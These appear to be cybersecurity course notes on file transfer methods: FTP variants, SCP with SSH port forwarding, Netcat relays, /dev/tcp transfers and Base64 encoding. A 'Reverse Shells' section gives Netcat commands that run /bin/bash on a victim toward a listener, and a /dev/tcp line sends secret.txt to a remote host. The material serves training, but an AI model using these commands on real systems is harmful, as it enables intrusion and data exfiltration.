File Transfer Day-5

  ~Outcomes
    Describe Data Transfer and Exfiltration
    Demonstrate File Transfer 

  ~Standard File Transfer Methods
      Describe common file transfer methods
    Understand the use of Active and Passive FTP modes
    Use SCP to transfer files
    
  ~Methods of transferring data
    TFTP
    FTP
    Active
    Passive
    FTPS
    SFTP
    SCP
    
  ~TFTP
    Trivial File Transfer Protocol
    RFC 1350 Rev2
    UDP transport
    Extremely small and very simple communication
    No terminal communication
    Insecure (no authentication or encryption)
    No directory services
    Used often for technologies such as BOOTP and PXE
    
  ~FTP
    File Transfer Protocol
    RFC 959
    Uses 2 separate TCP connections
    Control Connection (21) / Data Connection (20*)
    Authentication in clear-text
    Insecure in default configuration
    Has directory services
    Anonymous login
    
  ~FTPS
    File Transfer Protocol Secure
    Adds SSL/TLS encryption to FTP
    Interactive terminal access
    Explicit Mode: ports 20/21* (not auto encrypted Client-Server negotiates encryption)
    Option for Encryption
    Implicit Mode: ports 989/990* (Predetermined encryption)
    Encrytion assumed

  ~SFTP
    Secure File Transfer Protocol
    TCP transport (port 22)
    Uses symmetric and asymmetric encryption
    Adds FTP like services to SSH
    Authentication through sign in (username and password) or with SSH key
    Interactive terminal access

  ~SCP
    Secure Copy Protocol
    TCP Transport (port 22)
    Uses symmetric and asymmetric encryption
    Authentication through sign in (username and password) or with SSH key
    Non-Interactive
  ~Options
    .  - Present working directory
    -v - verbose mode
    -P - alternate port
    -r - recursively copy an entire directory
    -3 - 3-way copy
  ~Syntax
    Download a file from a remote directory to a local directory - $ scp student@172.16.82.106:secretstuff.txt /home/student
    Upload a file to a remote directory from a local directory - $ scp secretstuff.txt student@172.16.82.106:/home/student
    Copy a file from a remote host to a separate remote host - $ scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student
    Recursive upload of a folder to remote - $ scp -r folder/ student@172.16.82.106:
    Recursive download of a folder from remote - $ scp -r student@172.16.82.106:folder/ .
    Download a file from a remote directory to a local directory - $ scp -P 1111 student@172.16.82.106:secretstuff.txt .
    Upload a file to a remote directory from a local directory - $ scp -P 1111 secretstuff.txt student@172.16.82.106:
    Create a local port forward to target device - $ ssh student@172.16.82.106 -L 1111:localhost:22 -NT
    Download a file from a remote directory to a local directory - $ scp -P 1111 student@localhost:secretstuff.txt /home/student
    Upload a file to a remote directory from a local directory - $ scp -P 1111 secretstuff.txt student@localhost:/home/student
    Create a Dynamic Port Forward to target device - $ ssh student@172.16.82.106 -D 9050 -NT
    Download a file from a remote directory to a local directory - $ proxychains scp student@localhost:secretstuff.txt .
    Upload a file to a remote directory from a local directory - $ proxychains scp secretstuff.txt student@localhost:

  ~Uncommon Methods of file transfer
    Demonstrate the use of Netcat for data transfer
    Perform traffic redirection using Netcat relays
    Discuss the use of named and unnamed pipes
    Conduct file transfers using /dev/tcp

  ~Netcat
    NETCAT simply reads and writes data across network socket connections using the TCP/IP protocol.
    Can be used for the following:
    inbound and outbound connections, TCP/UDP, to or from any port
    troubleshooting network connections
    sending/receiving data (insecurely)
    port scanning (similar to -sT in Nmap)
  ~Syntax
    Client to listener
      Listener (receive file) - nc -lvp 9001 > newfile.txt
      Client (sends file) - nc 172.16.82.106 9001 < file.txt
    Listener to client
      Listener (sends file) - nc -lvp 9001 < file.txt
      Client (receive file) - nc 172.16.82.106 9001 > newfile.txt
      
  ~Netcat Relay Listener-Listener
    On Blue_Host-1 Relay - $ mknod mypipe p
    $ nc -lvp 1111 < mypipe | nc -lvp 3333 > mypipe
    On Internet_Host (send) -  nc 172.16.82.106 1111 < secret.txt
    On Blue_Priv_Host-1 (receive) - $ nc 192.168.1.1 3333 > newsecret.txt

  ~Netcat Relay Client-Client
    On Internet_Host (send) - $ nc -lvp 1111 < secret.txt
    On Blue_Priv_Host-1 (receive) - $ nc -lvp 3333 > newsecret.txt
    On Blue_Host-1 Relay - $ mknod mypipe p
    $ nc 10.10.0.40 1111 < mypipe | nc 192.168.1.10 3333 > mypipe

  ~Netcat Relay Client-Listener
    On Internet_Host (send) - $ nc -lvp 1111 < secret.txt
    On Blue_Priv_Host-1 (receive) - $ nc 192.168.1.1 3333 > newsecret.txt
    On Blue_Host-1 Relay - $ mknod mypipe p
    $ nc 10.10.0.40 1111 < mypipe | nc -lvp 3333 > mypipe

  ~Netcat Relay Listener-Client
    On Internet_Host (send) - $ nc 172.16.82.106 1111 < secret.txt
    On Blue_Priv_Host-1 (receive) - $ nc -lvp 3333 > newsecret.txt
    On Blue_Host-1 Relay - $ mknod mypipe p
    $ nc -lvp 1111 < mypipe | nc 192.168.1.10 3333 > mypipe

  ~File Transfer with /dev/tcp (Useful for hosts without netcat available)
    On the receiving box - $ nc -lvp 1111 > devtcpfile.txt
    On the sending box - $ cat secret.txt > /dev/tcp/10.10.0.40/1111

  ~Reverse Shells (insider attemptiong to open reverse shell for you)
    Using Netcat
      First listen for the shell on your device - $ nc -lvp 9999
      On Victim using -c - $ nc -c /bin/bash 10.10.0.40 9999
      On Victim using -e - $ nc -e /bin/bash 10.10.0.40 9999

  ~Packing and Encoding
    Discuss the purpose of packers
    Perform Hexadecimal encoding and decoding
    Demonstrate Base64 encoding and decoding
    Conduct file transfers with Base64

  ~Packers
    Special code added to programs to compress executables
    Reduces network traffic
    Used for obfuscation
    Reduces time on target
    Example: UPX

  ~Encoding and Decoding
    Specialized formatting
    Used for transmission and storage
    Hex and Base64 are the most common
    NOT Compression
    NOT Encapsulation
    NOT Encryption

  ~Hexadecimal Encoding and Decoding
    Converts the binary representation of a data set to the 2 digit base-16 equivalent.
    Used by IPv6 and MAC addresses
    Color schemes
    Increases readability and information density

  ~XXD
    echo a string of text and use xxd to convert it to a plain hex dump with the -p switch\ - $ echo "Hex encoding test" | xxd -p
    echo hex string and use xxd to restore the data to its original format - $ echo "48657820656e636f64696e6720746573740a" | xxd -r -p

  ~Base64 Encoding and Decoding
    binary-to-text encoding
    A-Z, a-z, 1-9, +, /
    6 bits per non-final digit
    (4) 6-bit groups per (3) 8-bit groups
    padding used to fill in any unused space in each 24-bit group

  ~Transfer with Base64
    generate the base64 output of a file, with line wrapping removed - $ base64 -w0 logoCyber.png
    create a new file on your machine - $ nano b64image.png
    decode from base64 with -d - $ base64 -d b64image.png > logoCyber.png
